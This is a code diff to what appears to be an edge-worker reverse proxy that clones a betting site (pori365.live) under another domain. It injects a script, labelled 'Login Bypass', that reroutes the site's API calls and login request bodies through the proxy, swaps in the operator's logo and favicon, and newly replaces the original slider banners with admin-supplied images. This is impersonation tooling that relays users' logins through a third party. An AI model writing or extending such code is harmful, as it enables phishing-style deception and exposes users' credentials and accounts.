@@ -25,20 +25,28 @@ async function getDynamicConfig() {
           finalBanners[i] = (dbBanners[i] && dbBanners[i] !== "") ? dbBanners[i] : ""; 
       }
 
+      // ★ নতুন: স্লাইডার ডাটা ফেচ করা
+      let dbSliders = fields.sliders?.arrayValue?.values?.map(v => v.stringValue) || [];
+      let finalSliders = new Array(5).fill(""); 
+      for(let i=0; i<5; i++) {
+          finalSliders[i] = (dbSliders[i] && dbSliders[i] !== "") ? dbSliders[i] : ""; 
+      }
+
       cachedConfig = {
         targetDomain: fields.targetDomain?.stringValue?.replace(/^(https?:\/\/)?(www\.)?/i, '').split('/')[0] || "pori365.live",
         themeColor: fields.themeColor?.stringValue || "#FCAF04",
         favicon: fields.favicon?.stringValue || "",
         logo: fields.logo?.stringValue || "",
         loginBg: fields.loginBg?.stringValue || "",
-        banners: finalBanners
+        banners: finalBanners,
+        sliders: finalSliders // ★ নতুন স্লাইডার অ্যারে যুক্ত হলো
       };
       lastCacheTime = now;
       return cachedConfig;
     }
   } catch (err) {}
   
-  return cachedConfig || { targetDomain: "pori365.live", themeColor: "#FCAF04", favicon: "", logo: "", loginBg: "", banners: new Array(12).fill("") };
+  return cachedConfig || { targetDomain: "pori365.live", themeColor: "#FCAF04", favicon: "", logo: "", loginBg: "", banners: new Array(12).fill(""), sliders: new Array(5).fill("") };
 }
 
 export default {
@@ -198,12 +206,15 @@ export default {
            text = text.replace('<head>', `<head>\n<link rel="icon" type="image/x-icon" href="${config.favicon}">\n<link rel="shortcut icon" href="${config.favicon}">`);
         }
 
-        // ★ Login Bypass Script Logic Added Back ★
+        // ★ Login Bypass Script & Image Replacer ★
         const interceptorScript = `
         <script>
           (function() {
             const proxyDom = "${proxyDomain}"; const targetDom = "${targetDomain}";
             const customLogo = "${config.logo}";
+            // ★ নতুন: এডমিন থেকে পাওয়া স্লাইডারগুলো
+            const customSliders = ${JSON.stringify(config.sliders || [])};
+            const validSliders = customSliders.filter(s => s !== "");
 
             const needsProxy = function(url) {
               if (typeof url !== 'string') return false;
@@ -218,7 +229,6 @@ export default {
               } else if (args[0] instanceof Request && needsProxy(args[0].url)) {
                 if (!args[0].url.includes('/_api_proxy/')) { args[0] = new Request('https://' + proxyDom + '/_api_proxy/' + args[0].url, args[0]); }
               }
-              // Request Body replace (For Login)
               if (args[1] && args[1].body && typeof args[1].body === 'string') {
                 args[1].body = args[1].body.split(proxyDom).join(targetDom);
               }
@@ -246,6 +256,28 @@ export default {
                   bgLogos.forEach(el => { if (el.style.backgroundImage !== 'url("' + customLogo + '")') el.style.setProperty('background-image', 'url("' + customLogo + '")', 'important'); });
                   const imgLogos = document.querySelectorAll('.home_logo img, img[src*="logo"]');
                   imgLogos.forEach(img => { if (img.src && !img.src.includes(customLogo) && (img.closest('.home_logo') || img.src.includes('/static/media/logo'))) img.src = customLogo; });
+              }
+
+              // ★ নতুন: টপ স্লাইডার রিপ্লেস করার কোড (আপনার দেওয়া স্ক্রিনশট অনুযায়ী)
+              if (validSliders.length > 0) {
+                 const sliderImgs = document.querySelectorAll('.slick-slide img');
+                 sliderImgs.forEach(img => {
+                    // স্ক্রিনশটে দেখা যাচ্ছে ইমেজ URL এ banner-uploads বা txnrep আছে
+                    if (img.src && (img.src.includes('banner-uploads') || img.src.includes('txnrep') || img.src.includes('trueexch.com:5018'))) {
+                       const slideDiv = img.closest('.slick-slide');
+                       if (slideDiv) {
+                          const dataIndex = parseInt(slideDiv.getAttribute('data-index') || "0");
+                          // Slick slider এর নেগেটিভ index ফিক্স করার ফর্মুলা
+                          const mappedIndex = ((dataIndex % validSliders.length) + validSliders.length) % validSliders.length;
+                          
+                          if (img.src !== validSliders[mappedIndex]) {
+                              img.src = validSliders[mappedIndex];
+                              // স্লাইডারের স্টাইল যেন ঠিক থাকে
+                              img.style.width = "100%";
+                          }
+                       }
+                    }
+                 });
               }
             });
             document.addEventListener("DOMContentLoaded", () => { observer.observe(document.documentElement, { childList: true, subtree: true, attributes: true, attributeFilter: ['style', 'class', 'src'] }); });
